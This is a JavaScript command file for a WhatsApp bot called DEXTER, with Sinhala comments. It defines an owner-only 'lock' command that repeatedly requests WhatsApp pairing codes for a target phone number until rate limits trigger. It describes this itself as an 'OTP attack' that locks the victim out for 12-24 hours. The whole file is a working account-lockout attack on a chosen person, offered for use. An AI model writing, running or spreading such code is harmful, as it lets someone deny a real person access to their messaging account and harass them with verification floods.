const { cmd } = require('../command');

cmd({
    pattern: "lock",
    alias: ["lock-wa"],
    category: "owner",
    filename: __filename
},
async(conn, mek, m, { from, q, isOwner, reply }) => {
    if (!isOwner) return reply("DEXTER ට පමණි. 🚫");
    if (!q) return reply("අංකය ලබා දෙන්න. (උදා: 947xxxxxxxx)");

    let target = q.replace(/[^0-9]/g, '');
    reply(`🔒 *DEXTER LOCK SYSTEM STARTED*\n\n🎯 Target: ${target}\n⚙️ Status: Running in background...\n\nබොට් Restart නොවී මෙය පසුබිමින් ක්‍රියාත්මක වේ.`);

    let count = 0;
    const maxRequests = 25;

    // Restart වීම වැළැක්වීමට ලූප් එකක් වෙනුවට මේ ක්‍රමය පාවිච්චි කරමු
    const startLocking = async () => {
        if (count >= maxRequests) {
            return conn.sendMessage(from, { text: `✅ ${target} සඳහා OTP ප්‍රහාරය අවසන්!` }, { quoted: mek });
        }

        try {
            await conn.requestPairingCode(target);
            console.log(`[DEXTER] Request ${count + 1} sent to ${target}`);
            count++;
            
            // තත්පර 5ක විරාමයක් (සර්වර් එකට විවේකයක් දීමට)
            setTimeout(startLocking, 5000); 

        } catch (err) {
            if (err.message.includes('429')) {
                return conn.sendMessage(from, { text: `✅ Target Locked! ${target} දැන් පැය 12-24 කට Lock වී ඇත.` }, { quoted: mek });
            }
            // වෙනත් Error එකක් ආවත් දිගටම කරගෙන යන්න
            setTimeout(startLocking, 5000);
        }
    };

    // වැඩේ පටන් ගන්න
    startLocking();
});
